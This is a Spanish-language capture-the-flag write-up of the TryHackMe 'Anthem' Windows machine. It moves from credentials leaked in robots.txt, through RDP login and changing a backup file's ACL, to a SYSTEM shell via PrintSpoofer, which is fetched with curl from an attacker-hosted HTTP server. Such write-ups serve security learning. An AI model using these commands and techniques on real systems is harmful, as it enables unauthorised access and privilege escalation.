---
layout: page
title: "Write-up: Anthem"
platform: "TryHackMe"
difficulty: "Medium"
category: "Boot2Root"
---
**Write-up**: Anthem - TryHackMe  
**Fecha**: 04/04/2026  
**Autor**: Adrian Sanchez Torrejon  
**Dificultad**: Media  
**IP de la Máquina**: 10.129.165.242

---

# 1. Resumen Ejecutivo

La máquina Anthem de TryHackMe es de dificultad fácil con el sistema operativo Windows. El vector de entrada inicial consistió en una fuga de información en el portal web (OSINT), deduciendo el formato de usuarios a través de las publicaciones y extrayendo la contraseña directamente del archivo `robots.txt` expuesto. Esto permitió acceder al sistema vía RDP. Tras la entrada, la escalada de privilegios se logró modificando las listas de control de acceso (ACL) de un fichero de respaldo que contenía la clave del Administrador, y finalmente se obtuvo acceso SYSTEM mediante PrintSpoofer.

- **Acceso a Usuario**: Conseguido
- **Acceso a Root(SYSTEM)**: Conseguido

# 2. Reconocimiento y Enumeración

## 2.1 Escaneo de Puertos (Nmap)

Se realiza un escaneo inicial para identificar los puertos abiertos y los servicios en ejecución.

```bash
nmap -sV -O -Pn 10.129.165.242
```

**Resultados:** 

![image.png](/assets/images/Anthem/image.png)

# 3. Explotación (Acceso Inicial)

## 3.1 Identificación de la Vulnerabilidad

Al examinar las publicaciones del blog en el servidor web, se observó que los correos electrónicos seguían el formato de iniciales del nombre combinadas con el dominio.

![image.png](/assets/images/Anthem/image%201.png)

Gracias a un poema encontrado en el sitio, se dedujo el nombre de usuario `SG`

sg@anthem.com

![image.png](/assets/images/Anthem/image%202.png)

Al auditar el archivo `robots.txt`, se halló un comentario con la cadena de texto `UmbracoIsTheBest!`, que resultó ser la contraseña.

![image.png](/assets/images/Anthem/image%203.png)

Con los credenciales que sacamos antes (`sg@anthem.com:UmbracoIsTheBest!`) conseguimos entrar

![image.png](/assets/images/Anthem/image%204.png)

## 3.2 Ejecución y Shell

Utilizando las credenciales obtenidas mediante la recolección de información, se estableció una conexión de Escritorio Remoto con la herramienta `xfreerdp`:

```bash
xfreerdp /v:10.129.165.242 /u:SG /p:UmbracoIsTheBest!
```

![image.png](/assets/images/Anthem/image%205.png)

# 4. Escalada de Privilegios (System / Root)

## 4.1 De Usuario a Administrador (Abuso de Permisos)

1. Una vez en la sesión RDP como el usuario `SG`, se localizó una carpeta en la raíz del disco `C:\` llamada `backup`. Dentro de ella se encontraba un archivo de texto llamado `restore.txt` al cual el usuario no tenía acceso de lectura por defecto.

![image.png](/assets/images/Anthem/image%206.png)

1. Dado que el usuario actual poseía los permisos requeridos para modificar la seguridad en la interfaz de Windows, se procedió a alterar los permisos del archivo `restore.txt`. Se agregaron privilegios de lectura para el propio usuario `SG`.

![image.png](/assets/images/Anthem/image%207.png)

1. Al inspeccionar el contenido del archivo, se descubrió en texto plano la contraseña de la cuenta del administrador.

Credenciales: `Administrator:ChangeMeBaby1MoreTime`

![image.png](/assets/images/Anthem/image%208.png)

1. Se procedió a cerrar la sesión y entrar nuevamente como Administrador:

Comando: 

```bash
xfreerdp /v:10.129.165.242 /u:Administrator /p:ChangeMeBaby1MoreTime
```

![image.png](/assets/images/Anthem/image%209.png)

## 4.2 De Administrador a SYSTEM (PrintSpoofer)

Tras conseguir el acceso administrativo, se procedió a consolidar el máximo privilegio utilizando la herramienta PrintSpoofer para explotar la personificación de tokens.

Archivo: [https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe)

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
curl http://192.168.146.227/PrintSpoofer64.exe -o PrintSpoofer64.exe
./PrintSpoofer64.exe -i -c powershell
```

![image.png](/assets/images/Anthem/image%2010.png)

# 5. Recomendaciones de Mitigación

- **No almacenar credenciales en texto plano**: No es una buena práctica dejar archivos de texto que contengan contraseñas en carpetas desprotegidas del sistema de archivos.
- **Cuidado con las fugas en archivos de configuración pública**: Los archivos de rastreo como `robots.txt` son accesibles para cualquier usuario y nunca deben tener anotaciones de seguridad o contraseñas.